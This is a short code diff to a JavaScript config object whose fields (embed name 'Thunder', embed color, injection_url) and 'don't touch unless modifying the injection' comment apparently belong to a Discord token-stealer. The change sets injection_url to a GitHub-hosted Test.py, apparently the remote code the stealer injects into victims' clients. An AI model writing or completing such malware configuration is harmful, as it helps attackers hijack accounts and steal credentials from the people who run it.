@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Thunder', 
   embed_icon: ''.replace(/ /g, '%20'), 
   embed_color: 8363488, 
-  injection_url: '', 
+  injection_url: 'https://github.com/Bo-hak-Kun/Test/blob/main/Test.py', 
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
